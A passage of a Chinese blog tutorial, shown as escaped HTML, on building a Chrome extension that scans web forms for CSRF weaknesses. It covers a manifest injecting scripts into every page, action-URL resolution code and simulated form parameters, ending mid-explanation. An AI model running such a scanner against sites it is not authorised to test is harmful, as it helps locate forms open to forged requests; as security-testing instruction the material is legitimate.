class=&quot;attr&quot;&gt;&quot;version&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;1.0.0&quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;attr&quot;&gt;&quot;manifest_version&quot;&lt;/span&gt;: &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;attr&quot;&gt;&quot;description&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;CSRF[by:Black-Hole&amp;amp;158099591@qq.com]&quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;attr&quot;&gt;&quot;content_security_policy&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;script-src &#39;self&#39; &#39;unsafe-eval&#39;; object-src &#39;self&#39;&quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;attr&quot;&gt;&quot;permissions&quot;&lt;/span&gt;: [     &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;&amp;lt;all_urls&amp;gt;&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;tabs&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  ],&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;attr&quot;&gt;&quot;icons&quot;&lt;/span&gt;:&amp;#123;&lt;span class=&quot;attr&quot;&gt;&quot;16&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;icons/icon_16.png&quot;&lt;/span&gt;,&lt;span class=&quot;attr&quot;&gt;&quot;48&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;icons/icon_48.png&quot;&lt;/span&gt;,&lt;span class=&quot;attr&quot;&gt;&quot;128&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;icons/icon_128.png&quot;&lt;/span&gt;&amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;attr&quot;&gt;&quot;content_scripts&quot;&lt;/span&gt;: [&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;matches&quot;&lt;/span&gt;: [&lt;span class=&quot;string&quot;&gt;&quot;*://*/*&quot;&lt;/span&gt;],&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;js&quot;&lt;/span&gt;: [&lt;span class=&quot;string&quot;&gt;&quot;jquery.js&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;base.js&quot;&lt;/span&gt;],&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;run_at&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;document_end&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;content_security_policy 简称CSP，用户限制插件的安全性&lt;/p&gt;
&lt;p&gt;permissions 是插件向Chrome申请的权限。&lt;/p&gt;
&lt;p&gt;content_scripts 意思是，在任何协议下，当网站加载完成后，都会运行jquery.js和base.js文件。JavaScript this指向的是当前网页&lt;/p&gt;
&lt;p&gt;background JavaScript this指向的是插件，用户处理base.js和background.js通信的存在&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;而&lt;a href=&quot;http://www.freebuf.com/articles/web/107207.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;上一篇文章&lt;/a&gt;的JavaScript代码，都存放在base.js里，待会说“检测Referer机制”时，也是写在这个文件里。&lt;/p&gt;
&lt;h4 id=&quot;0x03：检测对方是否开启了Referer检测机制&quot;&gt;&lt;a href=&quot;#0x03：检测对方是否开启了Referer检测机制&quot; class=&quot;headerlink&quot; title=&quot;0x03：检测对方是否开启了Referer检测机制&quot;&gt;&lt;/a&gt;0x03：检测对方是否开启了Referer检测机制&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;首先为了下面程序的简洁，先把当前表单的action地址赋值给一个变量：&lt;br&gt;&lt;code&gt;actionCache = formDom.attr(&amp;quot;action&amp;quot;);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;然后匹配action地址。为什么要匹配action地址呢，因为action分为以下几种情况：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;#test&lt;/p&gt;
&lt;p&gt;./test.php &amp;amp;&amp;amp; ./test(处理方式一样)&lt;/p&gt;
&lt;p&gt;/test.php?a=11&lt;/p&gt;
&lt;p&gt;test.php&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://baidu.com/?s=&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://baidu.com/?s=&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这里我们使用switch来实现匹配，代码如下：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;switch&lt;/span&gt;(actionCache[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;])&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;#&quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        actionPath = location.href + actionCache;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;/&quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        actionPath = location.origin + actionCache;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;.&quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(actionCache.indexOf(&lt;span class=&quot;string&quot;&gt;&quot;?&quot;&lt;/span&gt;) != &lt;span class=&quot;string&quot;&gt;&quot;-1&quot;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            actionvParameter = &lt;span class=&quot;string&quot;&gt;&quot;?&quot;&lt;/span&gt; + actionCache.split(&lt;span class=&quot;string&quot;&gt;&quot;?&quot;&lt;/span&gt;)[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            actionCache = actionCache.slice(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,actionCache.indexOf(&lt;span class=&quot;string&quot;&gt;&quot;?&quot;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(location.href.split(&lt;span class=&quot;string&quot;&gt;&quot;/&quot;&lt;/span&gt;).pop().split(&lt;span class=&quot;string&quot;&gt;&quot;.&quot;&lt;/span&gt;).length == &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            actionPath = location.href + actionCache.substr(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,actionCache.length&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;) + actionvParameter;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            actionPath = location.href.substr(location.href,location.href.lastIndexOf(location.href.split(&lt;span class=&quot;string&quot;&gt;&quot;/&quot;&lt;/span&gt;).pop())) + actionCache.substring(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,actionCache.length) + actionvParameter;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;default&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(location.protocol == &lt;span class=&quot;string&quot;&gt;&quot;http:&quot;&lt;/span&gt; || location.protocol == &lt;span class=&quot;string&quot;&gt;&quot;https:&quot;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            actionPath = location.href;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(location.href.split(&lt;span class=&quot;string&quot;&gt;&quot;/&quot;&lt;/span&gt;).pop().split(&lt;span class=&quot;string&quot;&gt;&quot;.&quot;&lt;/span&gt;).length == &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            actionPath = location.href + &lt;span class=&quot;string&quot;&gt;&quot;/&quot;&lt;/span&gt; + actionCache;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            actionPath = location.href.substr(location.href,location.href.lastIndexOf(location.href.split(&lt;span class=&quot;string&quot;&gt;&quot;/&quot;&lt;/span&gt;).pop())) + actionCache;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;当action地址的第一个值是&lt;code&gt;#&lt;/code&gt;时，直接使用&lt;code&gt;location.href + actionCache;&lt;/code&gt;拼接。&lt;/p&gt;
&lt;p&gt;当action地址的第一个值是&lt;code&gt;/&lt;/code&gt;时，使用&lt;code&gt;location.origin + actionCache;&lt;/code&gt;来进行拼接&lt;/p&gt;
&lt;p&gt;当action地址的第一个值是&lt;code&gt;.&lt;/code&gt;时：&lt;br&gt;先使用indexOf函数来把参数赋值给一个变量并去除，&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(actionCache.indexOf(&lt;span class=&quot;string&quot;&gt;&quot;?&quot;&lt;/span&gt;) != &lt;span class=&quot;string&quot;&gt;&quot;-1&quot;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    actionvParameter = &lt;span class=&quot;string&quot;&gt;&quot;?&quot;&lt;/span&gt; + actionCache.split(&lt;span class=&quot;string&quot;&gt;&quot;?&quot;&lt;/span&gt;)[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    actionCache = actionCache.slice(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,actionCache.indexOf(&lt;span class=&quot;string&quot;&gt;&quot;?&quot;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;详细的情况如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com/CSRF2/img/5.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;然后根据有无后缀进行匹配：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(location.href.split(&lt;span class=&quot;string&quot;&gt;&quot;/&quot;&lt;/span&gt;).pop().split(&lt;span class=&quot;string&quot;&gt;&quot;.&quot;&lt;/span&gt;).length == &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    actionPath = location.href + actionCache.substr(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,actionCache.length&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;) + actionvParameter;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    actionPath = location.href.substr(location.href,location.href.lastIndexOf(location.href.split(&lt;span class=&quot;string&quot;&gt;&quot;/&quot;&lt;/span&gt;).pop())) + actionCache.substring(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,actionCache.length) + actionvParameter;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;location.href.split(&amp;quot;/&amp;quot;).pop().split(&amp;quot;.&amp;quot;).length&lt;/code&gt;是检测&lt;code&gt;当前url&lt;/code&gt;有无后缀，如果有那么长度是为2.如果没有后缀长度是1。如果没有参数，将不会加任何字符串，因为在初始变量的时候就已经设为空了。详情如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com/CSRF2/img/3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com/CSRF2/img/4.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;除去这些之外，还有直接是文件名或者直接是url，这里呢，我直接写到switch的default分之上去了，因为无法使用&lt;code&gt;actionCache[0]&lt;/code&gt;来匹配，代码如下：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;default&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(location.protocol == &lt;span class=&quot;string&quot;&gt;&quot;http:&quot;&lt;/span&gt; || location.protocol == &lt;span class=&quot;string&quot;&gt;&quot;https:&quot;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        actionPath = location.href;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(location.href.split(&lt;span class=&quot;string&quot;&gt;&quot;/&quot;&lt;/span&gt;).pop().split(&lt;span class=&quot;string&quot;&gt;&quot;.&quot;&lt;/span&gt;).length == &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        actionPath = location.href + &lt;span class=&quot;string&quot;&gt;&quot;/&quot;&lt;/span&gt; + actionCache;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        actionPath = location.href.substr(location.href,location.href.lastIndexOf(location.href.split(&lt;span class=&quot;string&quot;&gt;&quot;/&quot;&lt;/span&gt;).pop())) + actionCache;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;首先是判断&lt;code&gt;location.protocol&lt;/code&gt;是否为http或https协议。如果是的话，直接使用&lt;code&gt;location.href;&lt;/code&gt;。当不为&lt;a href=&quot;http://或者https://的时候，跳过此if判断。接下来就是判断url的后缀存在。如果存在将运行：`actionPath&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://或者https://的时候，跳过此if判断。接下来就是判断url的后缀存在。如果存在将运行：`actionPath&lt;/a&gt; = location.href + “/“ + actionCache;`，反馈如图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com/CSRF2/img/6.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;当存在后缀时，运行：&lt;code&gt;actionPath = location.href.substr(location.href,location.href.lastIndexOf(location.href.split(&amp;quot;/&amp;quot;).pop())) + actionCache;&lt;/code&gt;。反馈如图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com/CSRF2/img/7.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h4 id=&quot;0x04：模拟form的参数&quot;&gt;&lt;a href=&quot;#0x04：模拟form的参数&quot; class=&quot;headerlink&quot; title=&quot;0x04：模拟form的参数&quot;&gt;&lt;/a&gt;0x04：模拟form的参数&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;代码如下：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; v = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;v &amp;lt; formDom.find(&lt;span class=&quot;string&quot;&gt;&quot;:text&quot;&lt;/span&gt;).length;v++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; input = formDom.find(&lt;span class=&quot;string&quot;&gt;&quot;:text&quot;&lt;/span&gt;).eq(v);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(input.attr(&lt;span class=&quot;string&quot;&gt;&quot;name&quot;&lt;/span&gt;) != &lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(input.val() == &lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            ajaxParameter += input.attr(&lt;span class=&quot;string&quot;&gt;&quot;name&quot;&lt;/span&gt;) + &lt;span class=&quot;string&quot;&gt;&quot;=&quot;&lt;/span&gt; + &lt;span class=&quot;string&quot;&gt;&quot;15874583485&amp;amp;&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            ajaxParameter += input.attr(&lt;span class=&quot;string&quot;&gt;&quot;name&quot;&lt;/span&gt;) + &lt;span class=&quot;string&quot;&gt;&quot;=&quot;&lt;/span&gt; + input.val() + &lt;span class=&quot;string&quot;&gt;&quot;&amp;amp;&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ajaxParameter = ajaxParameter.substring(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,ajaxParameter.length&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;使用for循环对当前form表单下属性为text的input标签，然后使用&lt;code&gt;var input = formDom.find(&amp;quot;:text&amp;quot;).eq(v);&lt;/code&gt;来进行赋值，把当前的input赋值给input变量。&lt;/p&gt;
